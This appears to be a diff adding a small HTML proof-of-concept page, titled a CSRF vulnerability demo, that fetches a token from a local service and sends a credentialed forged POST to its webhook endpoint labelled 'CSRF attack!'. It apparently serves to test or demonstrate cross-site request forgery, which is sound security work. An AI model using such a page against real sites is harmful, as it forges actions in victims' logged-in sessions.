@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+  <html lang="en">
+  <head>
+      <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <title>CSRF Vulnerability Demo</title>
+      <script>
+          async function getCSRFToken() {
+              const response = await fetch('http://localhost:9090/token', {
+                  credentials: 'include'
+              });
+              if (response.ok) {
+                  const csrfToken = await response.text();
+                  document.getElementById('csrfToken').value = csrfToken;
+              }
+          }
+
+          function sendCSRFRequest() {
+              const csrfToken = document.getElementById('csrfToken').value;
+              fetch('http://localhost:9090/webhook', {
+                  method: 'POST',
+                  headers: {
+                      'Content-Type': 'application/json',
+                      'X-CSRF-Token': csrfToken
+                  },
+                  credentials: 'include', // Ensure cookies are included in the request
+                  body: JSON.stringify({ message: 'CSRF attack!' })
+              }).then(response => response.text())
+                .then(data => console.log(data));
+          }
+      </script>
+  </head>
+  <body onload="getCSRFToken()">
+      <h1>CSRF Vulnerability Demo</h1>
+      <input type="hidden" id="csrfToken" />
+      <button onclick="sendCSRFRequest()">Send CSRF Request</button>
+  </body>
+</html>
